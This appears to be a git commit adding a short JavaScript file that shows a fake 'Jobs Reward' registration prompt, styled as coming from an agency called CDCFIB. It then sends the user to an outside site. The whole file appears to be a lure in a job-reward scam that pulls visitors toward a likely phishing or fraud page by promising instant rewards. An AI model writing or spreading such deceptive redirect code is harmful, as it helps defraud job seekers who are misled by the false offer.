74ae999b174c758c51cd844912c5483c9da374b3
dataviewz <gloliousam2@gmail.com>
2026-06-14 05:46:06 -0700

    Create active-nigeriajobs.js

---
+++ active-nigeriajobs.js
@@ -0,0 +1,5 @@
+var password = 'Get Jobs Reward'
+password=prompt('CDCFIB: Hello, Register Now and receive Jobs Reward Instantly POWERED BY: (CDCFIB), click OK to Register Now','Get Jobs Reward');
+if (password != 'Get Jobs Reward') {
+location.href='https://ebekpoekpo.site/nigeriajobs';
+}
